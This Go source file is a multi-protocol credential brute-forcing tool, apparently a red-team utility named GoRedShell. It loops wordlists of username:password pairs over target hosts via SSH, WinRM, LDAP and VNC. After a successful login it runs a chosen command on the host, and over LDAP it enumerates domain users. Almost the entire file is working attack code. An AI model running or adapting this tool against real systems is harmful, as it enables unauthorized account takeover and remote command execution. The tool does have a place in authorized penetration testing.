package main

import (
	"bufio"
	"bytes"
	"context"
	"flag"
	"fmt"
	"net"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"github.com/NetSPI/goddi/ddi""
	"github.com/fatih/color"
	"github.com/kward/go-vnc"
	"github.com/masterzen/winrm"
	"golang.org/x/crypto/ssh"
	//github.com/StackExchange/wmi
)

var serverLog *os.File

var (
	inittime = time.Now()

	// currently supports ssh, vnc, winrm, ldap //wmi
	method = flag.String("method", "", "the auth mechanism to use for the authentication attempt (ssh, vnc, winrm, ldap)")

	hosts    = []string{}
	host     = flag.String("host", "", "indicate the host or ip address to brute force")
	hostList = flag.String("hostList", "", "indicate wordlist file that has hosts or ips on each line")

	creds    = []string{}
	cred     = flag.String("cred", "", "a single un:pw credential pair to use")
	credList = flag.String("credList", "", "a username:password combo wordlist list, with unique un:pw combos on each line")

	// users = []string{}
	// user = flag.String("user", "root", "indicate user to brute force")
	// userList = flag.String("userList", "userList.txt", "indicate wordlist file that has users on each line")
	// passwords = []string{}
	// password = flag.String("password", "toor", "indicate password to use to brute force")
	// passwordList = flag.String("passwordList", "passwordList.txt", "indicate wordlist file that has passwords on each line")

	nobanner = flag.Bool("nobanner", false, "set this to true to silence the banner when run")
	verbose  = flag.Bool("verbose", false, "verbosly send messages to the console")
	logName  = flag.String("logName", "logFile.txt", "indicate a file to log verbosly to")
	log      = flag.Bool("log", false, "indicate a file to log successful auths to")

	delay   = flag.Duration("delay", 0, "add a delay to each scan")
	timeout = flag.Duration("timeout", 300*time.Millisecond, "set timeout for an ssh response")

	// Optional flags for some auth methods (i.e. ldap)
	startTLS = flag.Bool("startTLS", false, "Use for StartTLS for the ldap connection")
	unsafe   = flag.Bool("unsafe", false, "Use for testing and plaintext connection")
	exec     = flag.String("exec", "", "a single command to execute when auth is successful")
)

type resp struct {
	Error error
	//	mu    sync.Mutex
}

type Win32_Process struct {
	Name string
}

// Checks that the mandatory paramaters / flags have been used or prompts and shutsdown
func paramCheck() bool {
	canRun := true
	// Make sure Host or HostList is set
	if (*host != "") || (*hostList != "") {
		if *verbose == true {
			message("note", "host or hostList has values set")
		}
	} else {
		message("warn", "No host or hostList provided!")
		canRun = false
	}
	// Make sure Cred or CredList is set
	if (*cred != "") || (*credList != "") {
		if *verbose == true {
			message("note", "cred or credList has values set")
		}
	} else {
		message("warn", "No cred or credList provided!")
		canRun = false
	}
	// Make sure an auth method has been selected
	if *method == "" {
		message("warn", "No auth method selected! (ssh, vnc, ldap, or winrm)")
		canRun = false
	} else {
		if *verbose == true {
			message("note", "method has values set")
		}
	}
	// Make sure an exec command has been selected
	//if *exec == "" {
	//	message("warn", "No exec cmd selected!")
	//	canRun = false
	//} else {
	//	if *verbose == true {
	//		message("note", "exec has values set")
	//	}
	//}
	if !canRun {
		message("warn", "Missing mandatory paramaters. use -h for the help menu.")
		return false
	} else {
		return true
	}
}

// Message is used to print a message to the command line
func message(level string, message string) {
	switch level {
	case "info":
		color.Cyan("[i]" + message)
		if *log == true {
			server("info: " + message)
		}
	case "note":
		color.Yellow("[-]" + message)
		if *log == true {
			server("note: " + message)
		}
	case "warn":
		color.Red("[!]" + message)
		if *log == true {
			server("warning: " + message)
		}
	case "debug":
		color.Red("[DEBUG]" + message)
		if *log == true {
			server("debug: " + message)
		}
	case "success":
		color.Green("[+]" + message)
		if *log == true {
			server("success: " + message)
		}
	default:
		color.Red("[_-_]Invalid message level: " + message)
		if *log == true {
			server("invalid: " + message)
		}
	}
}

func server(logMessage string) {
	serverLog.WriteString(fmt.Sprintf("[%s] - %s\r\n", time.Now(), logMessage))
}

func sshcon(target, user, password, command string) *resp {
	response := &resp{}
	config := &ssh.ClientConfig{
		User:            user,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Auth:            []ssh.AuthMethod{ssh.Password(password)},
		Timeout:         *timeout,
	}
	conn, err := ssh.Dial("tcp", target, config)
	if err != nil {
		if *verbose == true {
			message("note", "Auth failure for host "+target+" with un:pw - "+user+":"+password)
			//message("warn", "Errors creating ssh con: " + err.Error())
		}
	} else {
		message("success", "Created ssh connection to host "+target+" with un:pw - "+user+":"+password)
		session, _ := conn.NewSession()
		defer session.Close()
		var stdoutBuf bytes.Buffer
		session.Stdout = &stdoutBuf
		session.Run(command)
		if *verbose == true {
			message("note", "host "+target+" output: "+stdoutBuf.String())
		}
	}
	response.Error = err
	return response
}

// Needs testing and work
func vnccon(target, password string) {
	// Establish TCP connection to VNC server // Not a bad idea to do this universally
	nc, err := net.Dial("tcp", target)
	if err != nil {
		if *verbose == true {
			message("warn", "Error connecting to VNC host. "+err.Error())
		}
	}
	// Negotiate connection with the vnc server
	vcc := vnc.NewClientConfig(password)
	_, err = vnc.Connect(context.Background(), nc, vcc)
	if err != nil {
		if *verbose == true {
			message("warn", "Errors authenticating to the vnc server: "+err.Error())
		}
	} else {
		message("success", "vnc connection to host "+target+" with pw - "+password)
	}
}

// Needs testing and work
func winrmcon(target, user, password, command string) {
	// Split our target on : by host:port
	tz := strings.Split(target, ":")
	tzh, tzp := tz[0], tz[1]
	tzpi, _ := strconv.Atoi(tzp)
	// tzh for host and tzp for port (tzpi is the int type of the port), default winrm is 5985 or 5986
	endpoint := winrm.NewEndpoint(tzh, tzpi, false, false, nil, nil, nil, 0)
	client, err := winrm.NewClient(endpoint, user, password)
	if (err != nil) && (*verbose == true) {
		message("warn", "Errors creating winrm connection: "+err.Error())
		return
	} else if *verbose == true {
		message("note", "started winrm connection to host "+target+" with un:pw - "+user+":"+password)
	}
	//var stdoutBuf bytes.Buffer
	_, err = client.Run(command, os.Stdout, os.Stderr)
	if (err != nil) && (*verbose == true) {
		message("warn", "Errors running command: "+command+" - "+err.Error())
		return
	} else {
		message("success", "winrm connection to host "+target+" with un:pw - "+user+":"+password)
		return
	}
	//message("success", "winrm connection to host "+target+" with un:pw - " + user +":"+password)
}

// Needs testing and work
//func wmicon(target, user, password string) {
//  	// Split our target on : by host:port
//  	tz := strings.Split(target, ":")
//  	tzh, tzp := tz[0], tz[1]
//  	// tzh for host and tzp for port
//  	var dst []Win32_Process
//  	wqlQery := wmi.CreateQuery(&dst, "")
//  	err := wmi.Query(wqlQery, dst, tzh, "root\CIMV2", user, password)
//  	if err != nil {
//			if *verbose == true {
//		  		message("warn", "Errors Authenticating: "+err.Error())
//			}
//  		return
//  	} else {
//  		message("success", "Success authenticating to target ("+target+") as un:pw - "+user+":"+password)
//  		if *verbose == true {
//	  	    	for i, v := range dst {
//	  		    	message("note", "Process running on target" + " " + i + " " + v.Name)
//			    }
//		    }
//	    }
//}

// Needs testing and work
func ldapcon(target, user, password string) bool {
	// Split our target on : by host:port
	tz := strings.Split(target, ":")
	tzh, _ := tz[0], tz[1]
	// tzh for host and tzp for port (tzpi is the int type of the port), default ldap is 389 or 636

	// Split our uzer on / by domain:user
	uz := strings.Split(user, "/")
	uzd, uzu := uz[0], uz[1]
	// uzd is for the domain and uzu is for the user

	var ldapIP string
	ldapServer, ldapIP := goddi.ValidateIPHostname(tzh, uzd)
	baseDN := "dc=" + strings.Replace(uzd, ".", ",dc=", -1)
	username := uzu + "@" + uzd
	li := &goddi.LdapInfo{
		LdapServer:  ldapServer,
		LdapIP:      ldapIP,
		LdapPort:    uint16(389),
		LdapTLSPort: uint16(636),
		User:        username,
		Usergpp:     uzu,
		Pass:        password,
		Domain:      uzd,
		Unsafe:      *unsafe,
		StartTLS:    *startTLS}

	goddi.Connect(li)
	defer li.Conn.Close()
	message("success", "Authed to the dc ("+ldapIP+") w/ un:pw : "+username+":"+password+" !!")
	if *verbose == true {
		goddi.GetUsers(li.Conn, baseDN)
	}
	return true
}

func main() {
	// Get current working path
	ex, err := os.Executable()
	if err != nil {
		panic(err)
	}
	exPath := filepath.Dir(ex)
	// Parse flags
	flag.Parse()
	// Set up logging
	if *nobanner == false {
		if *verbose == true {
			color.Red(Banner1)
		}
		color.Red("Welcome to GoRedShell, don't get banned nub!")
	}
	logz := flag.Lookup("logName")
	//logging := flag.Lookup("logSuccess")
	if *log != true {
		if *verbose == true {
			message("note", "Logging not enabled!")
		}
	} else {
		// Server Logging
		if _, err := os.Stat(filepath.Join(exPath, logz.Value.String())); os.IsNotExist(err) {
			os.Create(filepath.Join(exPath, logz.Value.String()))
		}
		var errLog error
		serverLog, errLog = os.OpenFile(filepath.Join(exPath, logz.Value.String()), os.O_APPEND|os.O_WRONLY, 0600)
		if errLog != nil {
			color.Red("[!] " + errLog.Error())
		}
		defer serverLog.Close()
		if *verbose == true {
			message("info", "log file created at: "+filepath.Join(exPath, logz.Value.String()))
		}
	}

	// New Run!
	message("info", "Starting new run at: "+fmt.Sprintf("%s", time.Now()))

	//verboseFlag := flag.Lookup("verbose")
	hostFlag := flag.Lookup("host")
	hostListFlag := flag.Lookup("hostList")
	credFlag := flag.Lookup("cred")
	credListFlag := flag.Lookup("credList")
	if *verbose == true {
		message("info", "host flag: "+hostFlag.Value.String())
		message("info", "hostList flag: "+hostListFlag.Value.String())
		message("info", "cred flag: "+credFlag.Value.String())
		message("info", "credList flag: "+credListFlag.Value.String())
		message("info", "exec flag: "+*exec)
		message("info", "method flag: "+*method)
		//message("info", "timeout flag: "+strconv.Itoa(*timeout))
		//message("info", "delay flag: "+strconv.Itoa(*delay))
		message("info", "unsafe flag: "+strconv.FormatBool(*unsafe))
		message("info", "startTLS flag: "+strconv.FormatBool(*startTLS))
		message("info", "nobanner flag: "+strconv.FormatBool(*nobanner))
		message("info", "verbose flag: "+strconv.FormatBool(*verbose))
		message("info", "log flag: "+strconv.FormatBool(*log))
		message("info", "logName flag: "+*logName)
	}

	// Make sure our mandatory paramaters / flags are set or return without running
	shouldRun := paramCheck()
	if !shouldRun {
		if *verbose == true {
			message("warn", "Failed mandatory flag checks, plz set required flags!!")
		}
		return
	}

	// Collect our hosts first
	if *host != "" {
		hosts = append(hosts, hostFlag.Value.String())
	} else if *hostList != "" {
		hosts = append(hosts, readLines(hostListFlag.Value.String())...)
	} else {
		if *verbose == true {
			message("warn", "No hosts to scan")
		}
	}
	if hosts != nil {
		// Collect our creds
		if *cred != "" {
			creds = append(creds, credFlag.Value.String())
		} else if *credList != "" {
			creds = append(creds, readLines(credListFlag.Value.String())...)
		} else {
			if *verbose == true {
				message("warn", "No creds to scan with")
			}
		}
		if creds != nil {
			for credIndex, singleCred := range creds {
				cz := strings.Split(singleCred, ":")
				un, pw := cz[0], cz[1]
				if *verbose == true {
					message("info", "Trying credIndex: "+strconv.Itoa(credIndex+1)+", un:pw - "+un+":"+pw)
				}
				// Loop through all of our hosts
				for hostIndex, singleHost := range hosts {
					// Add multithreading here ?
					if *verbose == true {
						message("info", "Trying hostIndex: "+strconv.Itoa(hostIndex+1)+", host - "+singleHost)
					}
					// Switch mechanism on supported auth types
					switch *method {
					case "ssh":
						resp := sshcon(singleHost, un, pw, *exec)
						if resp.Error != nil {
							if *verbose == true {
								message("warn", "Error: "+resp.Error.Error())
							}
						} else {
							//message("success", "Success!!")
						}
					case "winrm":
						winrmcon(singleHost, un, pw, *exec)
					case "ldap":
						res := ldapcon(singleHost, un, pw)
						if !res && *verbose == true {
							message("warn", "Error authenticating to "+singleHost+"as un:pw - "+un+":"+pw)
						}
					//case "wmi":
					//	wmicon(singleHost, un, pw)
					case "vnc":
						vnccon(singleHost, pw)
					default:
						message("warn", "Select a method: ssh or winrm")
					}
				}
				// Add delay here ?
				time.Sleep(*delay)
			}
			message("success", "Done!!")
		} else {
			message("warn", "No creds to scan with")
		}
	} else {
		message("warn", "No hosts to scan")
	}
}

// readLines reads a whole file into memory
// and returns a slice of its lines.
func readLines(path string) []string {
	file, err := os.Open(path)
	if err != nil {
		return nil
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}
	return lines
}

const Banner1 string = `
                                            .,/(#%%&&%%#(/*..                                                                      
                                      ,(%@@@@@@&%##((((#%&@@@@@@%/.                                                                
                                 .(&@@@%/,..,*(#%&&&&&&&%#(*,.,(&@@@@@#,                                                           
                              *%@@(,.,(%@@@@@@@@@@@@@@@@@@@@@@@&* *%&@@@@&/                                                        
                           ,(@@&*./&@@@@@@@@@@@@@@@@@@@@@@@@&%//(%&%#/*#@@@.                                                     
                        .#@@@(.(@@@@@@@@@@@@@@@@@@@@@&%(/(#&@@@@@@@@@@@%,,&@@@&,                                                   
                      ,%@&(*/(((/((((((((/////***/((##, %@@@@@@@@@@@@@@@@&,,(@@@#.                                                 
                    .%@&(&@@@@@@@# .*&@@@@@@@@@@@@@@@@&.(@@@@@@@@@@@@@@@@@@(,.#@@&,                                                
                   #@@%#@@@@@@@@@,,&@@@@@@@@@@@@@@@@@@@/,@@@@@@@@@@@@@@@@@@@@, (@@&,                                               
                 *@@&(&@@@@@@@@@*/@@@@@@@@@@@@@@@@@@@@@%.%@@@@@@@@@@@@@@@@@@@@( ,&@@%.                                             
                (@@/(@@@@@@@@@@*(@@@@@@@@@@@@@@@@@@@@@@@,(@@@@@@@@@@@@@@@@@@@@@&..%@@&,                                            
               (@&*&@@@@@@@@@@,(@@@@@@@@@@@@@@@@@@@@@@@@/,@@@@@@@@@@@@@@@@@@@@@@@* #@@@*                                           
              *@@/&@@@@@@@@@@/*@@@@@@@@@@@@@@@@@@@@@@@@@/.%@@@@@@@@@@@@@@@@@@@@@@@*.(@@@,                                          
             /@@*&@@@@@@@@@&/.&@@@@@@@@@@@@@@@@@@@@@@@@@/ .%@@@@@@@@@@@@@@@@@@@@@@@#*#@@@(                                         
           ,#@@#&@@@@@@@@@@, #@@@@@@@@@@@@@@@@@@@@@@@@@@,(@%/.*%@@@@@@@@@@@@@@@@@@@@@%@@@@@#/                                      
          (@@@@@@@@@@@@@@@/ ,@@@@@@@@@@@@@@@@@@@@@@@@@@%,&@@@@&/  /@@@@*,           ./%@@@@@(                                    
        .%@@@@@@@@@@@@@@@&..(@@@@@@@@@@@@@@@@@@@@@@@@@@*/@@@@@@@@@@%#*.                  .(@@@@%.                                  
       (@@@#*.&@@@@@@@@@@# *%@@@@@@@@@@@@@@@@@@@@@@@@@( %@@@@@&(,                           .%@@@,                                 
     .%@@#.   &@@@@@@@@@# . *@@@@@@@@@@@@@@@@@@@@@@@@@#&@%/.                                  #@@&.                                
     %@@/     #@@@@@@@@(,&@/./@@@@@@@@@@@@@@@@@@@@@@&(,                                       .&@@(                                
   ./@@#      *@@@@@@@(,&@@&(.%@@@@@@@@@@@@@@@@@%/.                                            #@@#                                
   *%@@,       *&@@@@*,@@@@@@/,@@@@@@@@@@&%/*.                                                 (@@#                                
   /&@&.         .(&@@@@@@@@@@@@@(/,.                                       ,(&@@@@%.        %@@,                                
   *%@@,                                                                ,(&@@@@@@&../@&.      (@@/                                 
   .(@@/                                                           .,#&@@@@@@@@@@&.  %@/     *@@#                                  
     %@&.                                                    .*(&@@&%&@@@@@@@@@@@&.  ,@&.  /%@&,                                   
      %@&,                                             .*#&@@@@@/.   *@@@@@@@@@@@&.   %@%%@@@*                                     
       *@@#.                                    .*(%&@@@@@@&( %&.     #@@@@@@@@@@&.   %@@@#.                                       
        .(@@&*                            .**#&@@@@@@@@@@@@&( /@/     .&@@@@@@@@@*   .&@@*                                         
           .*%@@*,..        ..,*/##&&@@@@@@@@@@@@@@@@@@@@%*  %@,      *%@@@@%*     (@@/                                          
               .#@@%#%@@@@@@@@@@@@@@@/,   .%@@@@@@@@@@@@&,   .&@,                ./@@%                                           
                 /@&/ *@#         ,@@/        ./&@@@@@@@%*      ,&@#*             /@@@#                                            
                  #@@* #@,         /&&.            .*&@#         .%@@%*         *%@@@*                                             
                   *%@( (&,         .&&,              #@/          .,#&@@@&&&@@@@&*                                                
                     *&@#(@/.        .%@/              (@%,              ./@@@@(.                                                  
                       ,&@@@@%,        (@&*             .%@@&/.      ,(&@@@@%*                                                     
                         *&@@@@%*       *&@%(.            ,#%@@@&&&@@@@@@&/                                                        
                            .(&@@@@%#/,.   /#&@%/.           .,(@@@@@,                                                           
                                .*#&@@@@@@@@@@@@@@@@@@@@@@@@@@@&%/,                                                                
                                	.,*((##%%%%%%#(/*,.                      
        				    \(.@GRS@.)/,  
.	.	.	.	.	.	.	.	.	.	.	.	.								
.	.	.	.	.	.	.	.	.	.	.	.	.								`
